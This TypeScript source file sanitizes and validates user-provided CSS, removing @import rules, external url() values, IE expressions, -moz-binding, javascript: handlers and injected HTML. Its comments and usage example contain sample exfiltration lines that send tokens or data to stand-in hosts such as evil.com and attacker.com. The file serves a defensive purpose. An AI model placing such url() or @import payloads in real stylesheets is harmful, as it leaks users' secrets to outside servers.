/**
 * CSS Sanitizer
 *
 * Sanitizes CSS to prevent XSS and data exfiltration attacks.
 * This is critical for user-provided CSS that will be injected into the page.
 *
 * Attack vectors this protects against:
 * - Data exfiltration via @import url("attacker.com?data=...")
 * - Data exfiltration via background-image: url("attacker.com?data=...")
 * - JavaScript execution via expression() (IE legacy)
 * - XUL binding attacks via -moz-binding (Firefox legacy)
 * - JavaScript protocol handlers
 * - Behavior property (IE legacy)
 * - HTML injection via style tags
 */

/**
 * Checks if a URL is safe (relative, data:, or blob: URLs only)
 * External URLs are considered unsafe as they can be used for data exfiltration
 */
function isSafeUrl(url: string): boolean {
  const trimmedUrl = url.trim().toLowerCase();

  // Allow data: URLs (inline resources)
  if (trimmedUrl.startsWith('data:')) {
    return true;
  }

  // Allow blob: URLs (local blobs)
  if (trimmedUrl.startsWith('blob:')) {
    return true;
  }

  // Allow relative URLs (start with /, ./, or ../)
  if (trimmedUrl.startsWith('/') || trimmedUrl.startsWith('./') || trimmedUrl.startsWith('../')) {
    return true;
  }

  // Allow hash-only URLs (e.g., url(#gradient))
  if (trimmedUrl.startsWith('#')) {
    return true;
  }

  // Block everything else (http://, https://, //, or any absolute URL)
  return false;
}

/**
 * Sanitizes CSS to prevent XSS and data exfiltration attacks
 *
 * @param css - The raw CSS string to sanitize
 * @returns The sanitized CSS string
 *
 * @example
 * ```ts
 * const unsafeCSS = `
 *   @import url("https://evil.com/steal.css");
 *   .card { background-image: url("https://evil.com/?token=secret"); }
 * `;
 * const safeCSS = sanitizeCSS(unsafeCSS);
 * // Result: .card { background-image: url(); }
 * ```
 */
export function sanitizeCSS(css: string): string {
  if (!css) return '';

  let sanitized = css;

  // 1. Remove @import rules completely
  // These can load external stylesheets that bypass our sanitization
  sanitized = sanitized.replace(/@import\s+(?:url\s*\([^)]*\)|['"][^'"]*['"])[^;]*;?/gi, '');

  // 2. Remove url() functions with external URLs
  // Keep safe URLs (data:, blob:, relative paths, hash references)
  sanitized = sanitized.replace(
    /url\s*\(\s*(['"]?)([^)'"]*)(\1)\s*\)/gi,
    (match, _quote, urlContent) => {
      const trimmedUrl = urlContent.trim();

      // Empty URLs are safe
      if (!trimmedUrl) {
        return 'url()';
      }

      // Check if URL is safe
      if (isSafeUrl(trimmedUrl)) {
        return match; // Keep the original
      }

      // Replace unsafe URLs with empty url()
      return 'url()';
    },
  );

  // 3. Remove expression() - IE CSS expression (allows JavaScript execution)
  sanitized = sanitized.replace(/expression\s*\([^)]*\)/gi, '');

  // 4. Remove -moz-binding - Firefox XUL binding (allows XUL/JavaScript execution)
  sanitized = sanitized.replace(/-moz-binding\s*:[^;]*;?/gi, '');

  // 5. Remove javascript: protocol handlers
  sanitized = sanitized.replace(/javascript\s*:/gi, '');

  // 6. Remove behavior: property - IE behavior (allows HTC file execution)
  sanitized = sanitized.replace(/behavior\s*:[^;]*;?/gi, '');

  // 7. Remove HTML tags that might have been injected
  sanitized = sanitized.replace(/<[^>]*>/g, '');

  // 8. Remove @charset rules (can cause issues and aren't needed for inline styles)
  sanitized = sanitized.replace(/@charset\s+['"][^'"]*['"];?/gi, '');

  // 9. Remove @namespace rules (not needed for inline styles)
  sanitized = sanitized.replace(/@namespace\s+[^;]*;?/gi, '');

  return sanitized;
}

/**
 * Validates if CSS appears safe without modifying it
 * Useful for showing warnings to users before saving
 *
 * @param css - The CSS string to validate
 * @returns Object with isValid flag and array of warning messages
 */
export function validateCSS(css: string): {
  isValid: boolean;
  warnings: string[];
} {
  if (!css) return { isValid: true, warnings: [] };

  const warnings: string[] = [];

  // Check for @import
  if (/@import/i.test(css)) {
    warnings.push('@import rules will be removed (external stylesheets are not allowed)');
  }

  // Check for external URLs
  const urlMatches = css.match(/url\s*\(\s*(['"]?)([^)'"]*)(\1)\s*\)/gi) || [];
  for (const match of urlMatches) {
    const urlContent = match.replace(/url\s*\(\s*(['"]?)/i, '').replace(/['"]?\s*\)$/, '');
    if (urlContent && !isSafeUrl(urlContent)) {
      warnings.push(
        'External URLs in url() will be removed (only relative and data: URLs are allowed)',
      );
      break;
    }
  }

  // Check for expression()
  if (/expression\s*\(/i.test(css)) {
    warnings.push('CSS expressions will be removed (not supported)');
  }

  // Check for -moz-binding
  if (/-moz-binding/i.test(css)) {
    warnings.push('-moz-binding properties will be removed (not supported)');
  }

  // Check for javascript:
  if (/javascript\s*:/i.test(css)) {
    warnings.push('javascript: URLs will be removed');
  }

  // Check for behavior:
  if (/behavior\s*:/i.test(css)) {
    warnings.push('behavior properties will be removed (not supported)');
  }

  // Check for HTML tags
  if (/<[^>]*>/g.test(css)) {
    warnings.push('HTML tags will be removed');
  }

  return {
    isValid: warnings.length === 0,
    warnings,
  };
}
